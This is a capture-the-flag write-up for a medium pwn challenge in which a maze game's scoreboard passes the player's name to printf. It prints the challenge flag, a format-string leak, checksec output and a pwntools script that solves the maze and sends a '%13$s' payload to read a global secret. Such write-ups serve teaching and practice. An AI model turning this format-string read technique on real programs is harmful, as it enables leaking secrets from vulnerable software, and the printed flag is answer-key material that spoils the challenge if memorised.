# PWN - Maze Simulation
**Author** : k4  
**Difficulty**: <font color='green'>Medium</font>  
**Description**: Can you think outside of the box?

Attachments:
+ `pwn_maze_simulation.zip` - [Download](https://github.com/CyberHeroRS/scc2025-warmup/raw/refs/heads/pwn_maze/pwn_maze_simulation/public/pwn_maze_simulation.zip)

**Flag**: `SCC{h0w_d0_1_f0rm4t_th1s?_s50r3b04rd}`

# Writeup
### Overview
The binary allows us to play a little game where we traverse a maze
```
###################
#           #######
### ##### #    ####
###P#   # ####    #
### ### # #### ## #
#   ###        ## #
#####   #####  #  #
##### #########  ##
#     ###       ###
# ########## ######
# ###    ### ######
# ###### ###    E##
#  #### ##### #####
###################
Use w, a, s, d to move: 
```
and if we win we can even add our score to the scoreboard!
```
Congratulations, you exited the maze in 18.00 seconds.
Would you like to add your time to the scoreboard? [y/n]y
Enter your name: unk
==========================
|  GREAT HEIST           |
|  SIMULATORINATOR       |
|  SCOREBOARD            |
==========================
| Player | Time
==========================
| ???    | 0.1
--------------------------
| unk | 18.00
--------------------------
| MAN     | 10.5
--------------------------
| SOM     | 49.19
--------------------------
| VUC     | 105.6
==========================
```
### The Vulnerability
![image](https://github.com/user-attachments/assets/e0b002a5-24ca-42e2-b703-4e3f8f5754d5)

The vulnerability here is called a "format string vulnerability" and it happens when used-controlled data is directly passed to a printf-like function. See [owasp/format string attack](https://owasp.org/www-community/attacks/Format_string_attack). It is unsafe because it allows us to put format specifiers in the string, like so:
```
Congratulations, you exited the maze in 17.00 seconds.
Would you like to add your time to the scoreboard? [y/n]y
Enter your name: %p.%x.%llu
==========================
|  GREAT HEIST           |
|  SIMULATORINATOR       |
|  SCOREBOARD            |
==========================
| Player | Time
==========================
| ???    | 0.1
--------------------------
| 0x7ffdaf41e380.0.0 | 17.00
--------------------------
| MAN     | 10.5
--------------------------
| SOM     | 49.19
--------------------------
| VUC     | 105.6
==========================
```
which can give us arbitrary reads as well as arbitrary writes (if we're smart). For this challenge, only an arbitrary read will be necessary. Because...

![image](https://github.com/user-attachments/assets/01ac074d-0a8b-425e-8184-ede9e82fa78e)

the flag is stored in a global variable located

![image](https://github.com/user-attachments/assets/55bff4aa-96bb-4d20-b165-bf7d8a53f786)

on the `.bss` section. Thankfully, the binary is not PIE:
```
~> pwn checksec chal
[*] './pwn_maze_simulation/public/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
so we know the exact address of `secret_message`.

I will not explain how the format string arbitrary read works because there are many resources on it out there. Relatively comprehensive are https://axcheron.github.io/exploit-101-format-strings/ and https://github.com/hoppersroppers/nightmare/blob/master/modules/05-CriticalMisc/unit_06.md .

The payload we will be using is:
```python
secret_addr = 0x04041E0
payload = b'%13$s' + (8 - 5) * b'.' + pack(secret_addr)
p.sendlineafter(b'name: ', payload)
```

Now the only thing that's left is to write a script that solves the maze, and we're done!
```python
def move(direction, amount=1):
    for i in range(amount):
        p.sendlineafter(b'Use w, a, s, d to move:', direction)

p = start()

p.sendlineafter(b'Start', b'')
move(b'd', 10)
move(b's', 2)
move(b'd', 3)
move(b's', 1)
move(b'd', 3)
move(b's', 3)
move(b'a', 1)
move(b's', 1)
move(b'a', 1)
move(b's', 1)
move(b'a', 3)
move(b's', 3)
move(b'd', 4)

p.sendlineafter(b'[y/n]', b'y')

secret_addr = 0x04041E0
payload = b'%13$s' + (8 - 5) * b'.' + pack(secret_addr)
p.sendlineafter(b'name: ', payload)

p.interactive()
p.close()
```
![image](https://github.com/user-attachments/assets/2744629d-85c2-41be-9c1b-29a85226eafd)

GG :)
